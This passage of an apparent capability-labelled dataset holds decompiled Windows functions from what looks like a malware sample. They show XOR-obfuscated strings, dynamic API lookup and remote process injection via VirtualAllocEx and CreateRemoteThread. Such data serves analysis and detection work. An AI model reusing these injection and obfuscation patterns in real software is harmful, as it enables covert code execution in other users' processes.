_sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar6)(0, iVar9);\n            (*pcVar2)(uVar3);\n            goto code_r0x0040ee70;\n        }\n        var_50h = 0x2c3f5c06;\n        _var_4ch = 0x3f683e1d;\n        var_4bh._3_1_ = 4;\n        var_47h = 0x385c2f1b;\n        var_43h = 0x5c0b1d19;\n        var_3fh = 0x391d1929;\n        var_3bh = 0x4b;\n        var_3ah = 0x4d;\n        var_24h = 0x6b4d384a;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x78);\n        uVar3 = (*pcVar6)(8, 0x18);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar9 = var_ch;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_14h;\n            iVar7 = iVar4 % var_8h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_50h - var_14h];\n        } while (iVar4 < 0x17);\n        *0x41cdc0 = fcn.00408653(var_14h);\n        iVar4 = var_18h;\n        if (*0x41cdc0 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_50h = 0x33204419;\n            _var_4ch = 0x1356373f;\n            var_4bh._3_1_ = 0x35;\n            var_47h = 0x4412a06;\n            var_43h = 0x7e2f3134;\n            var_3fh = 0x313f2c15;\n            var_3bh = 0x4a;\n            var_3ah = 0x70;\n            var_34h = 0x41703343;\n            var_30h._0_2_ = CONCAT11(var_30h._1_1_, 0x50);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = var_ch;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_1ch;\n                iVar7 = iVar4 % var_8h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_34h + iVar7) ^ puVar1[&var_50h - var_1ch];\n            } while (iVar4 < 0x17);\n            *0x41cdc8 = fcn.00408653(var_1ch);\n            iVar4 = var_18h;\n            if (*0x41cdc8 != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                (*pcVar6)(uVar3);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*pcVar6)(uVar3);\n                uVar3 = (*pcVar2)(0, iVar9);\n                (*pcVar6)(uVar3);\n                goto code_r0x0040ee63;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        }\n        (*pcVar6)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar6)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar9);\n        (*pcVar6)(uVar3);\n    }\n    else {\ncode_r0x0040ee63:\n        puVar8 = 0x41cdb8;\n        for (iVar9 = 0x18; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *var_2ch = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_2ch = var_2ch + 1;\n        }\n    }\ncode_r0x0040ee70:\n    *0x41cdcc = *0x41cdc8 >> 0x20;\n    *0x41cdc4 = *0x41cdc0 >> 0x20;\n    *0x41cdbc = *0x41cdb8 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2246
    },
    "0040f041": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f041(int32_t *arg_8h, int32_t arg_ch, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint uVar7;\n    code *pcVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint unaff_EDI;\n    int64_t iVar12;\n    uint uVar13;\n    uint uStack196;\n    int16_t *piStack192;\n    int32_t *piStack188;\n    uint uStack184;\n    uint8_t auStack180 [4];\n    ushort uStack176;\n    uchar uStack174;\n    uchar uStack173;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack148;\n    uint uStack144;\n    ushort uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    int32_t iStack124;\n    int16_t *piStack120;\n    uint uStack116;\n    uint uStack112;\n    ushort uStack108;\n    uchar uStack106;\n    uchar uStack105;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    int32_t iStack92;\n    int32_t iStack88;\n    uint uStack80;\n    uchar *puStack76;\n    uchar *puStack72;\n    uchar auStack68 [2];\n    uint uStack66;\n    int16_t iStack62;\n    int16_t iStack60;\n    ushort uStack58;\n    uint uStack44;\n    uint32_t uStack40;\n    uint uStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack12;\n    \n    uStack164 = 0x40f056;\n    uStack40 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack40 = uStack40 & 0xff;\n    piVar1 = arg_8h + 1;\n    piStack32 = piVar1;\n    if (*piVar1 != 0) {\n        uStack164 = *piVar1;\n        puStack168 = 0x40f078;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar1 = 0;\n    }\n    uStack36 = 0xffffffff;\n    if (((arg_14h & 0x10) != 0) || ((*0x41ccc4 & 1) == 0)) {\n        uStack164 = 0x20;\n        puStack168 = 0x3000;\n        uStack172 = 0x5;\n        uStack176 = 0;\n        uStack174 = 0;\n        uStack173 = 0;\n        iVar5 = *arg_8h;\n        auStack180[0] = iVar5;\n        auStack180[1] = iVar5 >> 8;\n        auStack180[2] = iVar5 >> 0x10;\n        auStack180[3] = iVar5 >> 0x18;\n        uStack44 = 0;\n        uStack184 = 0x40f6f7;\n        iStack124 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)();\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtectEx;\n        if (iStack124 == 0) {\n            iStack124 = arg_ch;\n        }\n        else {\n            uStack184 = &stack0xffffffc0;\n            piStack188 = 0x40;\n            piStack192 = 0x5;\n            uStack196 = iStack124;\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)();\n            fcn.0040f996(uStack144);\n            fcn.0040f950(&stack0xffffff48, 5);\n            (*pcVar8)(*arg_8h);\n        }\n        if (CONCAT22(uStack58, iStack60) == 5) {\n            uStack184 = arg_8h + 3;\n            piStack188 = NULL;\n            piStack192 = lpParameter;\n            uStack196 = iStack124;\n            iVar5 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)();\n            arg_8h[1] = iVar5;\n            if (iVar5 == 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            else {\n                piStack192 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                uVar7 = 0;\n                *0x41d1e0 = CONCAT44(*0x41d1e4, *0x41d1e0);\n                if (piStack192 == NULL) {\n                    (*_sym.imp.KERNEL32.dll_GetExitCodeThread)();\n                    *0x41d1e0 = CONCAT44(*0x41d1e4, *0x41d1e0);\n                }\n            }\n        }\n        else {\n            uStack184 = 0xb;\n            piStack188 = 0x8;\n            uStack144 = 0x36324a04;\n            uStack140 = 0x6900;\n            piStack120 = 0x696c5a56;\n            uStack116 = CONCAT22(uStack116._2_2_, 0x6468);\n            piStack192 = 0x40f7f5;\n            piStack192 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            uStack196 = 0x40f7fc;\n            iStack124 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            uStack80 = 6;\n            iVar5 = 0;\n            puStack168 = &stack0xffffff60 + -iStack124;\n            do {\n                puVar2 = iVar5 + iStack124;\n                iVar10 = iVar5 % 6;\n                iVar5 = iVar5 + 1;\n                *puVar2 = (&stack0xffffff7c)[iVar10] ^ puVar2[&stack0xffffff60 + -iStack124];\n            } while (iVar5 < 10);\n            uStack196 = 0x15;\n            uStack104 = 0x34210038;\n            uStack100 = 0xb3139;\n            uStack96 = 0x31382228;\n            iStack92 = 0x5252018;\n            iStack88 = 0x740e352e;\n            uStack132 = 0x774d746a;\n            uStack128 = CONCAT22(uStack128._2_2_, 0x544b);\n            (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar10 = 0;\n            puVar6 = &stack0xffffff8c + -iVar5;\n            auStack180[0] = puVar6;\n            auStack180[1] = puVar6 >> 8;\n            auStack180[2] = puVar6 >> 0x10;\n            auStack180[3] = puVar6 >> 0x18;\n            do {\n                puVar2 = iVar10 + iVar5;\n                iVar11 = iVar10 % iStack92;\n                iVar10 = iVar10 + 1;\n                *puVar2 = (&stack0xffffff70)[iVar11] ^ puVar2[puVar6];\n            } while (iVar10 < 0x14);\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n            pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n            if (pcVar8 != NULL) {\n                iVar5 = (*pcVar8)(*arg_8h, 0, 0, 0, 0, 0, unaff_EDI, lpParameter);\n                if (iVar5 < 0) {\n                    iStack92 = fcn.00406346();\n                }\n                else {\n                    piStack192 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                    if (piStack192 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)();\n                    }\n                    iStack92 = 0;\n                }\n            }\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            uVar7 = (*pcVar4)(0, uStack136);\n            (*pcVar8)(uVar7);\n            uVar7 = uStack116;\n            *0x41d1e0 = CONCAT44(*0x41d1e4, *0x41d1e0);\n        }\n        goto code_r0x0040f6d3;\n    }\n    uStack164 = 0x20;\n    puStack168 = 0x3000;\n    uStack172 = 0xc;\n    uStack176 = 0;\n    uStack174 = 0;\n    uStack173 = 0;\n    iVar5 = *arg_8h;\n    auStack180[0] = iVar5;\n    auStack180[1] = iVar5 >> 8;\n    auStack180[2] = iVar5 >> 0x10;\n    auStack180[3] = iVar5 >> 0x18;\n    uStack12 = 0;\n    uStack28 = 0xb848;\n    uStack24 = 0;\n    uStack20 = 0xe0ff0000;\n    uStack184 = 0x40f0d2;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)();\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtectEx;\n    if (iVar5 == 0) {\n        iStack124 = arg_ch;\n    }\n    else {\n        uStack184 = &stack0xffffffe0;\n        piStack188 = 0x40;\n        piStack192 = 0xc;\n        uStack196 = iVar5;\n        (*_sym.imp.KERNEL32.dll_VirtualProtectEx)();\n        uStack66 = arg_ch;\n        iStack60 = arg_ch >> 0x10;\n        iStack62 = iStack60 >> 0xf;\n        iStack60 = iStack60 >> 0x1f;\n        fcn.0040f950(&stack0xffffffbc, 0xc);\n        (*pcVar8)(*arg_8h);\n    }\n    iVar12 = CONCAT44(puStack76, uStack136);\n    piStack120 = 0x5;\n    if (CONCAT22(uStack58, iStack60) == 5) {\n        if ((*0x41d1d8 | *0x41d1dc) == 0) {\n            uStack184 = 0x40f166;\n            fcn.00408eff();\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uStack184 = 0xb;\n            iVar5 = 0;\n            piStack188 = 0x8;\n            uStack108 = 0x2e38;\n            uStack106 = 8;\n            uStack104 = 0x36324a04;\n            uStack100 = CONCAT22(uStack100._2_2_, 0x6900);\n            uStack164 = 0x696c5a56;\n            piStack192 = 0x40f1a2;\n            uStack105 = 5;\n            piStack192 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            uStack196 = 0x40f1a9;\n            puStack72 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            uStack80 = 6;\n            puStack76 = &stack0xffffff88 + -puStack72;\n            do {\n                puVar2 = puStack72 + iVar5;\n                iVar10 = iVar5 % 6;\n                iVar5 = iVar5 + 1;\n                *puVar2 = (&stack0xffffff50)[iVar10] ^ puVar2[&stack0xffffff88 + -puStack72];\n            } while (iVar5 < 10);\n            uStack196 = 0xc;\n            puStack168 = 0x454d4e7a;\n            uStack164 = CONCAT31(uStack164._1_3_, 0x35);\n            (*pcVar8)();\n            iStack88 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar5 = 0;\n            puVar6 = &stack0xffffff54 + -iStack88;\n            iStack60 = puVar6;\n            uStack58 = puVar6 >> 0x10;\n            do {\n                puVar2 = iVar5 + iStack88;\n                iVar10 = iVar5 % 5;\n                iVar5 = iVar5 + 1;\n                *puVar2 = (&stack0xffffff4c)[iVar10] ^ puVar2[puVar6];\n            } while (iVar5 < 0xb);\n            iVar12 = fcn.00408653(iStack88);\n            uVar7 = 0xffffffff;\n            if (iVar12 != 0) {\n                uVar13 = 8;\n                uStack172 = 0x763c461e;\n                puStack168 = 0x59287530;\n                uStack164 = 0x46194213;\n                iVar10 = 0x42135935;\n                piStack188 = 0x76594675;\n                uStack184 = CONCAT31(uStack184._1_3_, 0x42);\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                puStack76 = iVar12 >> 0x20;\n                uStack136 = iVar12;\n                piStack120 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                puStack76 = iVar12 >> 0x20;\n                uStack136 = iVar12;\n                iVar5 = 0;\n                piStack192 = piStack120;\n                puStack72 = &stack0xffffff48 + -piStack120;\n                do {\n                    puVar2 = iVar5 + piStack120;\n                    iVar11 = iVar5 % iVar10;\n                    iVar5 = iVar5 + 1;\n                    *puVar2 = (&stack0xffffff38)[iVar11] ^ puVar2[&stack0xffffff48 + -piStack120];\n                } while (iVar5 < 0x16);\n                uStack116 = piStack120 >> 0x1f;\n                piVar9 = piStack120;\n                do {\n                    iVar3 = *piVar9;\n                    piVar9 = piVar9 + 1;\n                } while (iVar3 != 0);\n                iStack124 = 0;\n                iVar3 = (piVar9 - (piStack120 + 1) >> 1) * 2;\n                uStack128 = CONCAT22(iVar3 + 2, iVar3);\n                iVar5 = fcn.0040fc80(uStack148, iStack88, 4, 0, 0, 0, 0, 0, &stack0xffffff80, &stack0xffffff80 >> 0x1f, \n                                     &stack0xffffff70, &stack0xffffff70 >> 0x1f, uVar7, uVar13);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puStack76 = iVar12 >> 0x20;\n                uStack136 = iVar12;\n                if (iVar5 < 0) {\n                    iStack92 = fcn.00406346();\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                }\n                else {\n                    uStack184 = 0x34101411;\n                    auStack180[0] = 9;\n                    auStack180[1] = 5;\n                    auStack180[2] = 0x18;\n                    auStack180[3] = 0x10;\n                    uStack176 = 0x3f11;\n                    uStack174 = 0x6c;\n                    uStack196 = CONCAT22(uStack196._2_2_, 0x696c);\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    uStack100 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    iVar5 = 0;\n                    do {\n                        puVar2 = iVar5 + uStack100;\n                        iVar10 = iVar5 % uStack116;\n                        iVar5 = iVar5 + 1;\n                        *puVar2 = (&stack0xffffff2c)[iVar10] ^ puVar2[&stack0xffffff3c + -uStack100];\n                    } while (iVar5 < 0xb);\n                    uStack196 = 0x22512814;\n                    piStack192 = 0x51083225;\n                    piStack188 = 0x3f233e2e;\n                    uStack184 = 0x32232b60;\n                    auStack180[0] = 0x3b;\n                    auStack180[1] = 0x50;\n                    auStack180[2] = 0x43;\n                    uVar7 = (*pcVar8)(8, 0x14);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    iVar10 = 0;\n                    uStack172 = &stack0xffffff30 + -iVar5;\n                    do {\n                        puVar2 = iVar10 + iVar5;\n                        iVar11 = iVar10 % 5;\n                        iVar10 = iVar10 + 1;\n                        *puVar2 = (&stack0xffffff20)[iVar11] ^ puVar2[&stack0xffffff30 + -iVar5];\n                    } while (iVar10 < 0x13);\n                    *0x41d1d8 = fcn.00408653(iVar5);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack112);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                    puStack76 = iVar12 >> 0x20;\n                    uStack136 = iVar12;\n                }\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                puStack76 = iVar12 >> 0x20;\n                uStack136 = iVar12;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                puStack76 = iVar12 >> 0x20;\n                uStack136 = iVar12;\n                uVar7 = uStack80;\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            puStack76 = iVar12 >> 0x20;\n            uStack136 = iVar12;\n            (*_sym.imp.KERNEL32.dll_HeapFree)();\n            puStack76 = iVar12 >> 0x20;\n            uStack136 = iVar12;\n            uVar13 = (*pcVar8)();\n            puStack76 = iVar12 >> 0x20;\n            uStack136 = iVar12;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar13);\n            puStack76 = iVar12 >> 0x20;\n            uStack136 = iVar12;\n            *0x41d1e0 = CONCAT44(*0x41d1e4, *0x41d1e0);\n            if (*0x41d1d8 == 0) goto code_r0x0040f6d3;\n        }\n        else {\n            uVar7 = 0xffffffff;\n        }\n        *0x41d1dc = *0x41d1d8 >> 0x20;\n        piStack188 = arg_8h + 3;\n        uStack184 = piStack188 >> 0x1f;\n        piStack192 = NULL;\n        uStack196 = NULL;\n        iVar5 = fcn.0040fc80(*0x41d1d8, *0x41d1dc, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, iStack124, \n                             iStack124 >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        puStack76 = iVar12 >> 0x20;\n        uStack136 = iVar12;\n        arg_8h[1] = iVar5;\n        *0x41d1e0 = CONCAT44(*0x41d1e4, *0x41d1e0);\n        if (iVar5 != 0) {\n            uVar7 = 0;\n            *0x41d1e0 = CONCAT44(*0x41d1e4, *0x41d1e0);\n        }\n        goto code_r0x0040f6d3;\n    }\n    if ((*0x41d1e0 | *0x41d1e4) == 0) {\n        uStack184 = 0xb;\n        piStack188 = 0x8;\n        uStack108 = 0x2e38;\n        uStack106 = 8;\n        uStack104 = 0x36324a04;\n        uStack100 = CONCAT22(uStack100._2_2_, 0x6900);\n        uStack164 = 0x696c5a56;\n        piStack192 = 0x40f584;\n        uStack105 = 5;\n        piStack192 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        uStack196 = 0x40f58b;\n        iStack124 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        uStack80 = 6;\n        iVar5 = 0;\n        puStack168 = &stack0xffffff88 + -iStack124;\n        do {\n            puVar2 = iVar5 + iStack124;\n            iVar10 = iVar5 % 6;\n            iVar5 = iVar5 + 1;\n            *puVar2 = (&stack0xffffff50)[iVar10] ^ puVar2[&stack0xffffff88 + -iStack124];\n        } while (iVar5 < 10);\n        uStack196 = 0x15;\n        uStack104 = 0x34210038;\n        uStack100 = 0xb3139;\n        uStack96 = 0x31382228;\n        iStack92 = 0x5252018;\n        iStack88 = 0x740e352e;\n        uStack176 = 0x746a;\n        uStack174 = 0x4d;\n        uStack173 = 0x77;\n        uStack172 = CONCAT22(uStack172._2_2_, 0x544b);\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar10 = 0;\n        puVar6 = &stack0xffffff8c + -iVar5;\n        auStack180[0] = puVar6;\n        auStack180[1] = puVar6 >> 8;\n        auStack180[2] = puVar6 >> 0x10;\n        auStack180[3] = puVar6 >> 0x18;\n        do {\n            puVar2 = iVar10 + iVar5;\n            iVar11 = iVar10 % iStack92;\n            iVar10 = iVar10 + 1;\n            *puVar2 = (&stack0xffffff44)[iVar11] ^ puVar2[puVar6];\n        } while (iVar10 < 0x14);\n        fcn.00408eff();\n        *0x41d1e0 = fcn.00408653(iVar5);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)();\n        uVar7 = (*pcVar4)();\n        (*pcVar8)(uVar7);\n        if (*0x41d1e0 != 0) goto code_r0x0040f68f;\n    }\n    else {\ncode_r0x0040f68f:\n        *0x41d1e4 = *0x41d1e0 >> 0x20;\n        piStack188 = &stack0xffffff94;\n        uStack184 = piStack188 >> 0x1f;\n        uStack196 = arg_8h + 1;\n        piStack192 = uStack196 >> 0x1f;\n        iVar5 = fcn.0040fc80(*0x41d1e0, *0x41d1e4, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n        uVar7 = 0;\n        if (-1 < iVar5) goto code_r0x0040f6d3;\n    }\n    uVar7 = 0xffffffff;\ncode_r0x0040f6d3:\n    *0x41d1e4 = *0x41d1e0 >> 0x20;\n    *0x41d1dc = *0x41d1d8 >> 0x20;\n    return uVar7;\n}\n",
        "token_count": 5837
    },
    "0040fa5b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040fa5b(int32_t *param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    ushort var_30h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar8 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_3ch = 0x343d1b28;\n            var_38h = 0x3c001911;\n            var_14h = 6;\n            var_34h._0_2_ = 0x600;\n            var_34h._2_1_ = 0x1f;\n            var_34h._3_1_ = 0x1c;\n            var_30h = 0x3222;\n            var_2eh._0_2_ = 0x1c01;\n            var_2eh._2_2_ = 0x3409;\n            var_2ah._0_2_ = 0x7402;\n            stack0xffffffd4 = 0x70516f7a;\n            var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x74);\n            var_20h = param_2;\n            var_1ch = param_1;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            var_8h = 5;\n            iVar8 = 0;\n            var_10h = &var_3ch - var_18h;\n            do {\n                puVar1 = iVar8 + var_18h;\n                iVar6 = iVar8 % 5;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_2ah + iVar6 + 2) ^ puVar1[&var_3ch - var_18h];\n            } while (iVar8 < 0x14);\n            var_34h._0_2_ = 0x2e38;\n            var_34h._2_1_ = 8;\n            var_34h._3_1_ = 5;\n            var_30h = 0x4a04;\n            var_2eh._0_2_ = 0x3632;\n            var_2eh._2_2_ = 0x6900;\n            stack0xffffffd4 = 0x696c5a56;\n            var_24h._0_2_ = 0x6468;\n            uVar4 = (*pcVar2)(8, 0xb);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = var_18h;\n            iVar8 = 0;\n            var_10h = &var_34h - iVar5;\n            do {\n                puVar1 = iVar8 + iVar5;\n                iVar7 = iVar8 % var_14h;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_2ah + iVar7 + 2) ^ puVar1[&var_34h - iVar5];\n            } while (iVar8 < 10);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar5, var_18h);\n            var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n            uVar4 = (*pcVar2)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar8 = *hHeap;\n            var_1ch = var_1ch[1] + 0xc;\n            fcn.0040f9c9();\n            piVar3 = hHeap;\n            iVar8 = (*var_18h)(2, var_8h, hHeap[1], var_1ch, iVar8 + -0xc, &var_ch);\n            hHeap = iVar8;\n            if (iVar8 == 0) {\n                if (var_ch == piVar3[1]) {\n                    var_20h[1] = var_8h;\n                    *var_20h = var_ch;\n                }\n                else {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    iVar8 = -0x3fffff85;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*pcVar2)(uVar4);\n        }\n        else {\n            iVar8 = -0x3fffff85;\n        }\n    }\n    return iVar8;\n}\n",
        "token_count": 1358
    },
    "00404559": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404559(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t *piVar10;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int32_t pszFirst;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_30h = 0x3205372b;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x376d6729;\n    var_28h = 0x67453245;\n    pszFirst = 0x3269374f;\n    var_8h._0_2_ = 0x6745;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    do {\n        var_24h = 6;\n        puVar1 = iVar8 + piVar6;\n        iVar7 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&pszFirst + iVar7) ^ puVar1[&var_30h - piVar6];\n    } while (iVar8 < 0xc);\n    iVar8 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar8) {\n        iVar8 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x410310, 0, 1, 0x410320, &ppv);\n        if ((-1 < iVar8) && (ppv != NULL)) {\n            iVar8 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar8) && (var_20h != NULL)) {\n                iVar8 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar3 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar8 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar5 = *(var_1ch + var_10h * 